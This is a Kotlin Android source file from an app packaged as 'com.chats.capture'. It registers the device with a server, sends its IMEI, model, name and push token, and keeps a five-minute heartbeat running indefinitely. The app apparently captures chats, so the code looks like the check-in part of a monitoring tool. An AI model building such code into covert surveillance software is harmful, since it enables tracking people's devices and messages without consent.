package com.chats.capture.managers

import android.content.Context
import android.content.SharedPreferences
import com.chats.capture.network.ApiClient
import com.chats.capture.network.DeviceRegistrationRequest
import com.chats.capture.network.HeartbeatRequest
import com.chats.capture.utils.DeviceInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Manages device registration and heartbeat with the server
 */
class DeviceRegistrationManager(private val context: Context) {
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val prefs: SharedPreferences = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)
    
    private val KEY_DEVICE_ID = "device_id"
    private val KEY_REGISTERED = "device_registered"
    private val KEY_LAST_HEARTBEAT = "last_heartbeat"
    
    private val HEARTBEAT_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
    
    /**
     * Get or generate device ID
     */
    fun getDeviceId(): String {
        var deviceId = prefs.getString(KEY_DEVICE_ID, null)
        if (deviceId == null) {
            deviceId = DeviceInfo.getDeviceId(context)
            prefs.edit().putString(KEY_DEVICE_ID, deviceId).apply()
            Timber.d("Generated new device ID: $deviceId")
        }
        return deviceId
    }
    
    /**
     * Register device with server
     */
    fun registerDevice(fcmToken: String? = null) {
        serviceScope.launch {
            try {
                if (!ApiClient.isNetworkAvailable(context)) {
                    Timber.w("Network not available, skipping device registration")
                    return@launch
                }
                
                val deviceId = getDeviceId()
                val deviceName = DeviceInfo.getDeviceName(context)
                val model = DeviceInfo.getDeviceModel()
                val osVersion = DeviceInfo.getOsVersion()
                val imei = DeviceInfo.getImei(context)
                
                val registrationRequest = DeviceRegistrationRequest(
                    deviceId = deviceId,
                    deviceName = deviceName,
                    model = model,
                    osVersion = osVersion,
                    imei = imei,
                    fcmToken = fcmToken
                )
                
                val apiService = ApiClient.getApiService()
                val response = apiService.registerDevice(registrationRequest)
                
                if (response.isSuccessful) {
                    val body = response.body()?.string() ?: ""
                    // Handle both JSON and plain text "OK" responses
                    if (body.contains("OK") || body.contains("\"success\":true")) {
                        prefs.edit().putBoolean(KEY_REGISTERED, true).apply()
                        Timber.d("Device registered successfully: $deviceId")
                        
                        // Start heartbeat
                        startHeartbeat(fcmToken)
                    } else {
                        Timber.w("Device registration returned unexpected response: $body")
                    }
                } else {
                    Timber.w("Device registration failed with code: ${response.code()}")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error registering device")
            }
        }
    }
    
    /**
     * Send heartbeat to server periodically
     */
    private fun startHeartbeat(fcmToken: String?) {
        serviceScope.launch {
            while (true) {
                try {
                    delay(HEARTBEAT_INTERVAL_MS)
                    
                    if (!ApiClient.isNetworkAvailable(context)) {
                        Timber.v("Network not available, skipping heartbeat")
                        continue
                    }
                    
                    val deviceId = getDeviceId()
                    val heartbeatRequest = HeartbeatRequest(fcmToken = fcmToken)
                    
                    val apiService = ApiClient.getApiService()
                    val response = apiService.sendHeartbeat(deviceId, heartbeatRequest)
                    
                    if (response.isSuccessful) {
                        val body = response.body()?.string() ?: ""
                        // Handle both JSON and plain text "OK" responses
                        if (body.contains("OK") || body.contains("\"success\":true")) {
                            prefs.edit().putLong(KEY_LAST_HEARTBEAT, System.currentTimeMillis()).apply()
                            Timber.v("Heartbeat sent successfully")
                        } else {
                            Timber.v("Heartbeat response: $body")
                        }
                    } else {
                        Timber.w("Heartbeat failed with code: ${response.code()}")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error sending heartbeat")
                }
            }
        }
    }
    
    /**
     * Check if device is registered
     */
    fun isRegistered(): Boolean {
        return prefs.getBoolean(KEY_REGISTERED, false)
    }
    
    /**
     * Get last heartbeat time
     */
    fun getLastHeartbeat(): Long {
        return prefs.getLong(KEY_LAST_HEARTBEAT, 0)
    }
}
